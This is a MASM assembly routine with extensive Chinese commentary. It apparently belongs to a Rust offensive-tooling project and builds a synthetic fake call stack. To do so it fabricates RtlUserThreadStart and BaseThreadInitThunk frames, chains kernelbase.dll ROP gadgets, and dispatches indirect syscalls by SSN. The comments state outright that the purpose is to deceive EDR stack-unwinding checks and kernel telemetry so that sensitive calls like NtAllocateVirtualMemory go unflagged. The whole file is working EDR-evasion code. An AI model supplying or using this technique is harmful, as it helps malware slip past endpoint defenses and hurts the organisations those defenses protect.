;; code responsible for stack spoofing via Synthetic(masm)
;; uwd项目的核心,负责在物理内存中,把cpu寄存器和堆栈捏造成一个合法的系统调用栈,欺骗win10/11内核与edr

;; Synthetic 合成栈模式(默认主流):切断当前线程的真实历史栈,在内存中从0开始凭空捏在一套完整的包含4层合法系统函数的假调用链.
;; 绝大多数edr的栈回溯探针,主要校验的是:从当前RIP能否一路沿着pdata展开到RtlUserThreadStart,且RBP链表是否单调递增.而Synthetic能够完美欺骗这套逻辑.
;; 如果是叶子函数,edr这套逻辑是否失效.当然不可能出现这种漏洞.win的官方栈展开器RtlVirtualUnwind和edr对leaf function对于展开器遇到没有.pdata的叶子函数时情况.详见av edr原理/栈展开
;; 

;;
;; Export
;; 声明全局函数原型,让Rust链接器能够找到这个函数
;; proto是prototype缩写,代表函数声明
SpoofSynthetic proto

;; 这是一条汇编指示符,告诉编译器(ml64.exe)接下来的内容,属于.data范畴,而不是其他如.text的可执行cpu代码
;; 进入可读写数据段(rw权限,存放全局变量和静态变量static)
.data

;; 定义一个Config结构体
;; configuration structure passed to the spoof asm routine = struct Config {}
;;
Config STRUCT
    ;; DQ(define Quadword),8字节的RtlUserThreadStart函数物理地址.默认值为1,其默认值可为1 0 甚至是?号 作为语法占位符
    RtlUserThreadStartAddr          DQ 1 
    RtlUserThreadStartFrameSize     DQ 1

    BaseThreadInitThunkAddr         DQ 1
    BaseThreadInitThunkFrameSize    DQ 1

    FirstFrame                      DQ 1
    SecondFrame                     DQ 1
    JmpRbxGadget                    DQ 1
    AddRspXGadget                   DQ 1

    FirstFrameSize                  DQ 1
    SecondFrameSize                 DQ 1
    JmpRbxGadgetFrameSize           DQ 1
    AddRspXGadgetFrameSize          DQ 1

    RbpOffset                       DQ 1

    SpooFunction                    DQ 1
    ReturnAddress                   DQ 1

    ;; DD(define Doubleword)=u32/i32(Rust) 对应cpu寄存器eax,ecx等32位寄存器.这里定义为DD,因为微软规定,ssn必须装入32位的eax(不是64位的rax)
    ;; IsSyscall只是一个判断条件设为dd,是因为内存对齐的要求.详见注释1
    IsSyscall                        DD 0
    Ssn                              DD 0

    NArgs                        DQ 1
    Arg01                        DQ 1
    Arg02                        DQ 1
    Arg03                        DQ 1
    Arg04                        DQ 1
    Arg05                        DQ 1
    Arg06                        DQ 1
    Arg07                        DQ 1
    Arg08                        DQ 1
    Arg09                        DQ 1
    Arg10                        DQ 1
    Arg11                        DQ 1
Config ENDS

;; 进入.text节 编写cpu指令
.code 

;; proc是procedure(过程/子程序/函数)的缩写,是函数具体实现的真正起点(从{ 开始)
SpoofSynthetic PROC
;;
;; saving non-vol register:这三个寄存器都是非易失性的,用前必须保存,用后必须pop恢复.push指令在调用栈最前端开辟3个新的独立内存槽
;;rbp在项目中用于真实旧栈的基准位置指针(以rbp为基准(物理栈顶),记录父函数原本局部变量的位置),整个伪造栈执行完毕后,用于瞬间将所有假栈丢弃并归位.rbx用于gadget片段中(jmp [rbx]),返回真实执行流.r15用于通用寄存器,用于保存数据

push rbp
push rbx
push r15

;;
;; everything between rsp and rbp is our new stack frame for unwinding

;; 这里210h的含义,详见注释2
sub rsp,210h 
mov rbp,rsp

;;
;; creating stack pointer to restore proc
;;

;; 把RestoreSynthetic这个函数的内存入口地址(va),装到rax中(rax是易失性寄存器). 为什么不用mov 见注释3
lea rax,RestoreSynthetic
push rax
;; 见注释4
lea rbx,[rsp]

;; 构建虚构线程的合法物理起点
;; cutting the call stack.the 0 pushed in this position will be the return address of the next frame RtlUserThreadStart ,making it effectively the originating function
;; 见注释5

xor rax,rax
push rax

;; 
;; RtlUserThreadStart
;; 

;; 见注释6

sub rsp,[rcx].Config.RtlUserThreadStartFrameSize
push [rcx].Config.RtlUserThreadStartAddr

;; QWORD PTR指示cpu,将[rsp]当作一个8字节的内存数据进行操作,但不改变rsp寄存器本身
add QWORD PTR [rsp],21h

;;
;; BaseThreadInitThunk
;; 构建伪造栈的第3层栈帧(kernel32.dll!BaseThreadInitThunk),将该函数物理首地址压栈.其目的是
;; BaseThreadInitThunk偏移0x0F处是call指令(调用用户的实际业务函数) 加上call指令本身的5字节,那么在0x14处就是其子函数执行完毕后的返回地址.push已经将该函数地址压栈,add又在不改变rsp的前提下,将[rsp](rsp当作内存中的指针看待)偏移到0x14处,为BaseThreadInitThunk的子函数(secondframe)准备返回地址
;; 关于add这条指令的操作: 1. cpu提取rsp寄存器存放的数据,将其当作内存地址并读取该地址对应的数据; 2. cpu的算数逻辑单元alu执行运算,将上一步取到的内存中的数据做运算 3. cpu把运算后的新值,写回rsp指向的内存位置,覆盖掉了旧值 4. rsp指针本身不变,变的是[rsp]指向的内存中的数据
;; 但add之后,如果执行了修改rsp的指令(如 push等),那么再读[rsp]就不再是add运算后的新值了

sub rsp,[rcx].Config.BaseThreadInitThunkFrameSize
push [rcx].Config.BaseThreadInitThunkAddr
add QWORD PTR [rsp],14h

;; 继续向下(低地址)
;; return address
;; 此时rsp指向的内存中的数据,是上步add指令修改后的值(即内存中BaseThreadInitThunk + 0x14处).用rax来保存下来这个值.因为后续就要移动rsp了
mov rax,rsp

;; 和前面两个栈帧区别见注释7
;; first frame(fake origin,rbp作为栈帧基址的函数)
;; 

;; 将firstframe的返回地址压栈
push [rcx].Config.FirstFrame
;; 为后续在secondframe中将这里的rax写入secondframe的rbp: 模拟如果firstframe真的在内存中跑起来,并开辟自己的栈空间的话,它当时的栈顶应该落在内存的哪个位置.后续将其放入secondframe的rbp中
sub rax,[rcx].Config.FirstFrameSize

;; 开辟secondframe的栈帧空间
sub rsp,[rcx].Config.SecondFrameSize
;; r10易失性的. 保存secondframe原本rbp与当前rsp的距离.旧rbp位置
mov r10,[rcx].Config.RbpOffset
;; 将rax中的数据(代表firstframe的rbp位置),移动到[rsp+r10]代表的内存地址指向的数据,即firstframe的rbp.构造firstframe的栈基址rbp.当edr展开secondframe时,会从[rsp+r10]处把内存中的数据提取并赋给rbp,复原firstframe的栈基址
mov [rsp+r10],rax


;;
;; ROP frames
;;
;; uwd.rs中( config.second_frame_fp = (second_prolog.frame + second_prolog.offset as u64) as *const c_void;)从kernelbase.dll中挑选了一个带有rbp栈底指针的合法系统函数,并计算好了其内部指令的绝对物理地址.
;; 这里将(secondframe)second_frame_fp压栈,代表前面4层假栈已经在栈上布置完毕,下面就是ROP gadget层.这里作为ROP跳板展开后的合法着陆点,为EDR的栈展开提供向上衔接的通道 
push [rcx].Config.SecondFrame

;;
;; JMP [RBX] gadget/stack pivot支点(to restore original control flow stack)
;;
sub rsp,[rcx].Config.JmpRbxGadgetFrameSize
push [rcx].Config.JmpRbxGadget

sub rsp,[rcx].Config.AddRspXGadgetFrameSize
push [rcx].Config.AddRspXGadget

;;
;; set the pointer to the function to call in r11
;;
;; r11是易失性寄存器(volatile和non-volatile之间区别,在于子函数是否需要负责还原寄存器使用前的数据).cpu寄存器在物理上不会自己改变,除非显示调用(如xor mov add pop)改写.所以,这里给r11赋值之后,在 jmp ParametersSynthetic跳转后,r11的状态不会改变
;; 这里的SpooFunction代表rust中要执行的敏感函数
mov r11,[rcx].Config.SpooFunction
jmp ParametersSynthetic

SpoofSynthetic ENDP

;; 
;; Set the parameters the pass to the target function
;; 按照微软官方win64 fastcall调用约定,将在rust中准备好的11个参数,自动化的装填进cpu寄存器,最后jmp ExecuteSynthetic,开始执行真正的敏感函数
ParametersSynthetic PROC

;; 为什么要保存rcx 详见注释8
mov r12,rcx
;; Config.NArgs代表用户传入的参数总数
mov rax,[r12].Config.NArgs

; Arg01 (rcx)
;; cpu的alu执行rax-1,但不改变rax寄存器里的数值(即不 write-back写回:cpu执行指令时,经过4个阶段 取指fetch->译码decode->执行execute->写回write-back).
;; cmp指令:丢弃计算结果,只保留状态标志位(RFLAGS)的特殊减法指令
;; 这里含义是 rax代表的参数总数是否为0
cmp rax,1
;; jb = jump if below 如果RFLAGS(64个标志位的寄存器)的cf位为1 说明rax<1,即传入了0个参数 rip被修改为skip_1的物理内存地址 否则继续向下执行.之后从skip_2一直到最后,跳过11个参数的装填,直接执行敏感api
jb skip_1
mov rcx,[r12].Config.Arg01

;; 这种格式是汇编中的label标号/代码内存地址锚点.详见注释9
skip_1:
; Args02(rdx)
cmp rax,2
jb skip_2
mov rdx,[r12].Config.Arg02

skip_2:
    ; Arg03 (r8)
    cmp rax, 3
    jb skip_3
    mov r8, [r12].Config.Arg03
    
skip_3:
    ; Arg04 (r9)
    cmp rax, 4
    jb skip_4
    mov r9, [r12].Config.Arg04

skip_4:
; stack-based args

;; lea=load effective address :读取[rsp]代表的内存地址,但不读取对应内存地址中的内容
;; 将此时rsp保存,方便后续以此时的rsp为基准,偏移计算其他位置.r12和r13都是non-volatile
lea r13,[rsp]
cmp rax,5
jb skip_5
;; 
mov r10,[r12].Config.Arg05
;; r13 + 28h 翻过紧邻rsp的影子空间,压栈第五个参数(如果有第五个参数的话)
mov [r13+28h],r10

skip_5:
    ; Arg06
    cmp rax, 6
    jb skip_6
    mov r10, [r12].Config.Arg06
    mov [r13 + 30h], r10

skip_6:
    ; Arg07
    cmp rax, 7
    jb skip_7
    mov r10, [r12].Config.Arg07
    mov [r13 + 38h], r10

skip_7:
    ; Arg08
    cmp rax, 8
    jb skip_8
    mov r10, [r12].Config.Arg08
    mov [r13 + 40h], r10
    
skip_8:
    ; Arg09
    cmp rax, 9
    jb skip_9
    mov r10, [r12].Config.Arg09
    mov [r13 + 48h], r10

skip_9:
    ; Arg10
    cmp rax, 10
    jb skip_10
    mov r10, [r12].Config.Arg10
    mov [r13 + 50h], r10

skip_10:
    ; Arg11
    cmp rax, 11
    jb skip_11
    mov r10, [r12].Config.Arg11
    mov [r13 + 58h], r10

skip_11:
;; 判断是不是syscall.为什么到这里才判断sysycall 详见注释10
cmp [r12].Config.IsSyscall,1
;; je=jump if equal 也可以写成jz:上一步比较结果相等(zf==1)时跳转
je ExecuteSyscallSynthetic

jmp ExecuteSynthetic
ParametersSynthetic ENDP


;;
;; restores the original stack frame:清楚构建的虚假栈空间,回到rust真正的执行流中
;; 参看注释2的栈帧结构视图
RestoreSynthetic PROC
mov rsp,rbp
add rsp,210h
pop r15
pop rbx
pop rbp
ret
RestoreSynthetic ENDP

;;
;; Executes the target function
;;
ExecuteSynthetic  PROC
    jmp QWORD PTR r11
ExecuteSynthetic  ENDP

;;
;; Executes a native Windows system call using the spoofed context
;;
ExecuteSyscallSynthetic PROC
    mov r10, rcx
    mov eax, [r12].Config.Ssn
    jmp QWORD PTR r11
ExecuteSyscallSynthetic ENDP

END



;; 注释1
;; 1. 消除padding,防止Rust与汇编内存错位:64位cpu和win64 abi中,数据存放有一条规范,多大字节的数据,必须存放在能被该字节整除的内存地址上(自然对齐,natural alignment)
;; rustc在处理对齐时,会自动padding(如在#[repr(c)]下,会在1字节的数据后面padding 3字节以对齐) 但masm汇编器(ml64.exe)在解析STRUCT时,其内部对跨类型隐式padding的处理规则非常古老且脆弱,不会自动插入.这就导致对齐错位.这里将IsSyscall和Ssn置为dd,两者共8字节,没有任何隐式空洞,Rust和masm不会发生内存偏移的分歧
;; 2. windows sdk 的官方头文件minwindef.h中,微软对bool定义就是一个int,大小就是4字节(c/c++/win api中都是这样定义的).在win内部所有系统结构体中,bool一律是DWORD,Rust与win底层交互时,继承了win官方的bool规范
;; 3. win64下,cpu操作32位寄存器最原生和高效

;; 注释2
;; 在Intel和masm中,如果一个十六进制以a-f开头,前面必须补0(如 0FFh).h代表Hexadecimal 十六进制. 210h=528 十进制
;; win64下 rsp地址必须是16字节对齐的(能被16整除).否则会出现非法指令或内存对齐崩溃
;; 关于4kb缺页.win64规定如果汇编代码单次sub rsp超过或等于4kb(一个内存页),必须调用crt库的__chkstk函数逐页探测内存,如果不直接调用giant探测函数直接减去4kb,会触发STATUS_GUARD_PAGE_VIOLATION 内存崩溃
;; 对该函数:
;; 1. 进入该函数时,Rust call压栈返回地址,rsp-8
;; 2. 3次push 让rsp-24.此时rsp=32 满足16字节对齐
;; 3. sub rsp,210h 以此为锚点,开辟安全空间.开辟的空间也满足16字节对齐
;; 4. mov rbp,rsp;将rbp锚定在此,作为函数栈帧的基准指针.用于操作局部变量,准备跳板和终结符
;; 5. 伪造4层假调用栈: RtlUserThreadStart->BaseThreadInitThunk->SecondFrame (RBP 模式)-> FirstFrame (RSP 模式)
;; 6. ROP Gadget跳板和11个参数(Shadow Space + Stack Args)
;; 必须开辟安全空间:
;; 1. 当线程触发敏感的NtAllocateVirtualMemory,edr不仅在内核观察,还会通过用户态dll向当前线程插入apc或通过hook劫持控制流.edr注入的hook在执行时,会在当前线程栈顶开辟自己的栈帧.如果自己定义的真实数据(push rbp/rbx/r15)距离当前工作区太近,edr的hook routine在向下压栈写入局部变量时,会发生物理覆盖
;; 2. win的异常分发器SEH/VEH的栈下钻机制:如果目标函数在执行过程中,触发了任何软硬件异常(如 内存分页调整、STATUS_GUARD_PAGE_VIOLATION),win内核会调用用户态KiUserExceptionDispatcher.展开器RtlDispatchException 在寻找异常处理routine时,会在当前栈分配庞大的CONTEXT(1232字节)和DISPATCHER_CONTEXT 结构体.这也会占用栈空间
;; 3. 目标函数的参数,伪造的栈帧大小等不同因素,决定了目标函数执行完毕,返回rust时计算rsp比最初下移多少字节(恢复原始栈帧结构)的计算十分复杂.而这里,将安全空间(sub rsp,210h)的底端锚定在rbp中(mov rbp,rsp).在退出时(restoresynthetic),利用mov rsp,rbp在一个cpu时钟周期内就可以丢弃下方所有变长的假栈,之后再add rsp, 210h(丢弃安全空间),pop r15/rbx/rbp(注意和压栈顺序相反),再ret就优雅的返回了rust执行流
;; 但是这些可能占用栈空间的操作 怎么能保证落在开辟的210h中,而不是这个安全空间的前面和后面呢?
;; 正常执行流中,这210h空间是空置的,没有任何正常代码会向里面写入数据.后续所有的假栈,参数,目标api,edr的hook,win的异常分发器,都会在rbp向下更低的空间活动,不会占用这210h
;; 那何不将其置为0
;; 1. 在x64汇编和编译器生成的机器码中,有一个及其正常的现象,以基址指针正向偏移访问.如果空隙为0,那么rbp+0就是保存的r15; rbp+8就是保存的rbx; rbp+16就是保存到rbp.这会出现风险,如果有任何 如 编译器优化的局部变量访问,调试器探针,外部钩子代码尝试读取[rbp + 0x20]附近数据,就会踩进父函数物理私有空间,造成内存覆写.而210h,将r15/rbx/rbp 及父函数私有空间推到了210h之外的空间,这是绝对安全的高地.即使有几百个字节的正向探测或抖动,也触碰不到rust的核心数据
;; 2. win10/11 下,如果一个函数使用了rbp帧指针,但栈分配的大小为0,这是及其罕见且反常的.正常的系统业务函数,局部变量栈空间大小一般在100-200h之间.
;; 附 栈帧结构
; 高地址 (栈底)
; 
;   ┌────────────────────────────────────────────────────────────────────────┐
;     │ 1. Rust 父函数的真实栈空间 (局部变量、生命周期引用的内存)
;   │
;   ├────────────────────────────────────────────────────────────────────────┤
;     │ 2. 压栈备份的非易失寄存器: [RSP+228h] push rbp
;   │
;     │                           [RSP+220h] push rbx
;   │
;     │                           [RSP+218h] push r15
;   │
;   ├────────────────────────────────────────────────────────────────────────┤
;     │ 3. ★【0x210 (528 字节) 物理隔离安全气囊 / Firewall Buffer】★
;   │
;     │    (在此区域内，无论发生什么抖动，上下两端互不干扰)
;   │
;   ├────────────────────────────────────────────────────────────────────────┤
;   ◄── 【当前 RBP 锚定在此！】(mov rbp, rsp)
;     │ 4. 准备跳板与终结符:       [RBP-08h] push RestoreSynthetic
;   │
;     │                           [RBP-10h] push 0 (NULL, 终结展开)
;   │
;   ├────────────────────────────────────────────────────────────────────────┤
;     │ 5. 伪造的 4 层假调用链:   RtlUserThreadStart
;   │
;     │                           BaseThreadInitThunk
;   │
;     │                           SecondFrame (RBP 模式)
;   │
;     │                           FirstFrame (RSP 模式)
;   │
;   ├────────────────────────────────────────────────────────────────────────┤
;     │ 6. ROP Gadget 跳板与 11 个参数 (Shadow Space + Stack Args)
;   │
;   └────────────────────────────────────────────────────────────────────────┘
;   ◄── 当前 RSP (真正执行 syscall 的位置)

;; 注释3
;; 涉及到win10/11 下现代64位架构的物理机制:rip相对寻址和ASLR
;; 动态随机加载ASLR:现代os,每次运行程序时,代码被加载的内存地址都是完全随机的,编译期间无法知道RestoreSynthetic的绝对地址
;; rip相对寻址:在x64机器码中,汇编器会以当前cpu正在执行的rip为基准,加上相对偏移,实时计算RestoreSynthetic当前运行时的真实绝对地址
;; 展开来讲:
;; 1. mov语境下,mov rax,[RestoreSynthetic]会取到函数在执行期间的机器码.在内存中,函数也是数据,是一堆十六进制的机器码.mov语境下,会取该函数执行期间开头的8字节机器码指令.
;; 2. rax等通用寄存器是cpu硅晶芯片上的硬件电路,在cpu芯片内部,rax是64个物理触发器电路(几百个晶体管)焊接拼成的超高速物理存储单元.rax物理上固定8字节.rax的地址和rax的8字节存储空间是一回事吗?在mov等指令中的rax代表的是地址还是其存储的数据?有没有类似变量那种名称和存储的数据是分离的概念?
;; win64下,进程的虚拟内存寻址空间是64位的.无论变量地址,数组地址,函数地址(函数开头8字节机器码的物理地址va),在物理上都是一个标准的8字节整数.
;; 3. 内存Ram才有内存地址:如内存条(8G/16G),每个字节都有一个门牌号,cpu通过内存总线去寻址;寄存器:如Rax,在cpu芯片内部,不在内存里,是直接刻在cpu运算核心旁边的物理电路,在物理上没有内存地址,因此在c/rust中,&x可以对变量取地址,但永远不能对寄存器取地址
;; 高级语言如rust中的let x=100:变量名x与编译期符号绑定->内存地址->内存读写->Ram里面的数据100.变量名只是一个代号,它和实际存储数据的内存是分离的;而cpu硬件寄存器如rax,是纯物理实体,零中间层:rax(纯粹的硬件编号)->64个物理晶体管触发器本身->存储的高低电平数据.即rax既是名字,也是物理存储器本身,焊死在晶体管上,没有任何内存地址在中间中转
;; 4. 在mov语境下,[]用于区分寄存器的数据和地址.不带[]代表rax中存放的64位数据;带[]把rax中的数据当成内存地址去寻址

;; 注释4:在x86/x64规范中,lea指令右边强制必须带[]
;; lea rbx,[rsp]物理上等价于mov rbx,rsp 代表让rbx存入当前栈顶内存地址.不用mov rbx,[rsp](直接把数据给rbx),因为后续在系统dll中借用的trampoline是jmp [rbx](间接寻址),必须传入指针的指针
;; lea rbx,[rsp]:计算[rsp]地址本身,rsp不是没有地址吗?只是把rsp中的数据当作内存地址.等价于mov rbx,rsp.本质是让rbx成为一个指向栈顶的指针.
;; 改成mov rbx,rsp 也会运行,没有bug,但源码更好: 1. 语义明确为抓取指针,而非mov  ,rsp抓取数据 2. cpu内部执行指令的分工不同,mov是alu(通用算数端口)而lea是agu(地址生成端口).在密集算术计算代码中,使用lea代替mov,能让不同硬件端口并行工作,减轻alu流水线的拥堵 3. lea还比mov多一个字节机器码,但语义更加清晰.
;; mov rbx,[rsp]:先到栈里解引用,把rsp中存放着的RestoreSynthetic 函数地址读出来塞进 RBX.这里并不是物理规则或者规范,而是前面 lea rax,RestoreSyncthetic(函数地址给rax) push rax(rax压栈,此时rsp就在此处) lea rbx,[rsp](将rsp中存放的返回地址给rbx)
;;     为何不把RestoreSynthetic当作一个函数直接调用:1. 这个函数没有序言sub rsp,上来就是mov 物理本质上,它不是一个独立的函数,其实是SpoofSynthetic的退场处理 2. 如果call RestoreSynthetic , call会自动压栈8字节,但是这个函数第一行就是mov rsp,rbp(强行把rsp拽回最初锚点),如果call压入的返回地址被丢弃,随后的pop ret会乱码,程序抛出0xc0000005崩溃
;;      直接调用这个函数(非call)会被edr认为是未签名的私有内存(现代EDR最核心的内存属性特征):win中,所有内存在内核眼中分为官方背书的MEM_IMAGE(磁盘上合法dll文件映射的)和私有MEM_PRIVATE(程序运行时通过VirtualAlloc动态申请的),如果不用trampoline,敏感api如NtAllocateVirtualMemory返回地址置为RestoreSynthetic:
;; 1. NtAllocateVirtualMemory执行
;; 2. win内核的ETW-TI或EDR,检查当前栈顶,发现存放的是RestoreSynthetic
;; 3. EDR调用内核函数查询该地址属性(VirtualQuery)
;; 4. 发现其内存类型是MEM_PRIVATE,无磁盘映射,无数字签名
;; 5. EDR判定一个敏感的内存分配api,执行完毕返回到一个没有名字的私有内存中.会立即终止进程
;; 而uwd/mariana借用系统dll:
;; 在栈上由高地址到低地址,分别是: 3.RestoreSynthetic地址(rbx寄存器指向这里)->2. gadget2(jmp [rbx]位于kernelbase.dll内部)->1. gadget1(add rsp,58h;ret 位于kernelbase.dll)->4. 工作区(预留给敏感api的11个参数和影子空间,大小58h/88字节)->当前rsp(跳入目标api,栈顶,低地址)
;; 后续需要继续完成
;; 后续检查不出其他问题.
;; 源码将rbx指向栈顶,为什么不直接存函数地址:
;; 因为后续push [rcx].Config.JmpRbxGadget这段,压入jmp [rbx]指令的地址,在系统dll中该指令是带[]的.cpu遇到jmp [rbx]时,把rbx中的数据当作内存地址,去读对应内存中的数据,然后执行内存中的数据
;; 如果写成mov rbx,[rsp] 那么rbx此时是函数地址,此后执行jmp [rbx]时:cpu将函数地址当作内存地址去解引用;读取RestoreSynthetic代码开头机器码,把这串机器码当作一个目标跳转地址;结果是cpu试图跳到一个非法随机内存地址,程序抛出0xC0000005崩溃

;; 注释5
;; xor rax,rax : xor(相同为0,不同为1),将rax寄存器内部64位晶体管状态清零.相比mov rax,0 占用7-10字节,xor只需要2-3字节的机器码;且硬件零延迟,耗时0个时钟周期
;; push rax : 这里rax已为0,再把0 push到栈上,有何意义:
;; 和其他保存非易失性寄存器,然后再恢复使用的意义不同.这里保存0为了防止edr/RtlVirtualUnwind 回溯
;; edr从下向上回溯时,从敏感api(如 NtAllocateVirtualMemory)->firstframe->secondframe->BaseThreadInitThunk->RtlUserThreadStart
;; 在RtlUserThreadStart,展开器必须读取其返回地址决定下一步,但此时将其返回地址置为0(通过push rax),代表此函数就是整个线程的起点,回溯正常合法结束

;; 注释6
;; [rcx]表示Rust传进来的Config结构体的内存指针
;; RtlUserThreadStart 在正常运行时本身就会开辟自己的局部栈空间,在此之前已经在.pdata异常展开表中查到了它的大小,这里将这个栈空间空出来,专门给edr展开器逆推校验
;; QWORD PTR(Quad Word 四字=8字节);PTR(Pointer).跟在add后面代表操作的是8字节的指针.[rsp]是刚压入的函数首地址.这条指令(操作[rsp])物理上,rsp指针本身不动,[rsp]代表的内存中的数据加21h. 结果:栈顶存的返回地址,变成了ntdll!RtlUserThreadStart + 0x21
;; 在用windbg/ida 逆向win10/11 的ntdll.dll!RtlUserThreadStart汇编机器码会发现:
;; 1. win真实创建的每个线程中,RtlUserThreadStart在偏移0x1C处执行call BaseThreadInitThunk
;; 2. cpu执行call时,压入栈顶(注意,栈在硬件上,线程会共享栈,cpu内部只有一个物理rsp在其上下移动.这里的栈顶实质上是父函数压入的,子函数刚进入时作为子函数初始栈顶,并最终成为两层函数物理分界线的返回地址)的返回地址必定是call下一行的指令地址,即0x21处
;; 3. 如果不add 那么call时压栈的就是RtlUserThreadStartAddr的入口绝对地址(即0x00偏移处),这在逻辑上是不可能的,因为函数不可能在开头调用子函数.加上21h后,返回地址就精准落在call指令下一行mov ecx,eax 处,物理上与win官方真实线程的现场一样.
;; 4. win64下,call指令由1个字节的操作码Opcode 和 4个字节的相对跳转偏移量displacement,共5字节组成.所以0x1C + 5 =0x21
;; 以上,这里虚构了RtlUserThreadStart 栈帧的大小,函数开始地址,返回地址

;; 注释7
;; 前两层栈帧RtlUser和BaseThread,是固定win官方系统函数,其内部偏移量是固定的,其返回地址是用add指令计算的
;; 而first和seconde这两层frame,是从kernelbase.dll中搜索出来的,每次搜索到的函数不同,偏移也动态变化,其返回地址在uwd.rs中计算好了

;; 注释8
;; rust call -> spoofsynthetic jmp -> ParametersSynthetic jmp->敏感api
;; call 先将下一行返回地址压入栈 (push RIP)，然后修改 RIP,jmp 不压入任何返回地址，仅仅修改 RIP 直接执行跳转
;; 进入spoofsynthetic函数时,传入的参数是Config结构体的指针.在spoofsynthetic函数中又调用了ParametersSynthetic.ParametersSynthetic是纯粹的汇编函数,不遵守win64 fast call.但ParametersSynthetic又调用了敏感函数,这个敏感函数可需要rcx来承载它的第一个参数.如果不保存rcx,在ParametersSynthetic为敏感函数准备参数时(win64规定,caller需要为callee准备参数),会出现mov rcx, [rcx].Config.Arg01这种情况,导致rcx被覆盖,后续就没有代表config指针的寄存器了.
;; rust中的extern "C" { fn SpoofSynthetic(config: *mut Config); }约定了汇编中SpoofSynthetic的参数情况;但ParametersSynthetic这个纯粹的汇编函数,没有形如rust的显示定义参数,只是单纯的操作寄存器和内存,实现其功能.这是汇编和rust等高级语言的区别

;; 注释9
;; label: 1. 物理体积永远为0(零开销),在这里汇编器把代码编译为二进制机器码时,只帮编译器算出了cmp rax,1 的内存地址
;; 2. 贯穿执行(fall-through):在rust中一个函数执行完会自动return出来,不会自动执行下一个函数.但在label中,如果没有跳转指令,cpu会无视label执行所有相邻的label

;; 注释10
;; fastcall和syscall物理上装填参数的规则都一样(只有陷入内核才会将rcx改为r10).如果把cmp IsSyscall,1 放在开头,je装填sysycall参数,jmp装填fastcall参数.会出现写两遍装填11个参数的冗余.放在最后分流,可以减少冗余
;; syscall在陷入内核的那刻,用r10代替rcx承载第1个参数.但在用户态,不管syscall或fastcall,c/rust编译器都会把第1个参数放入rcx.

;; 关于non-volatile的r12和r13 没有保存就使用,且后期没有恢复
;; win64 abi规范中r12和r13是non-volatile的,需要和这里的rbp rbx r15一样先push 在最后再逆序pop.
;; 但在uwd/mariana中,rust侧通过unsafe调入SpoofSynthetic前后,外部rust包装函数并没有在r12 r13中存放关键上下文.
;; 且uwd/mariana中,为了追求极致简洁和最小栈开销操作,将r12 r13作为内部转储的临时指针使用.因此源码没有对r12 r13做额外的push/pop保护
;; abi规范不是语法,编译器/链接器不会因此报错.
;; 且本文件的设计,序言压栈字节数 rbp相对偏移 RestoreSynthetic物理挂载点 4层假栈起点.都是围绕3次压栈数学建模的.原作者是经过自洽和实战检验的.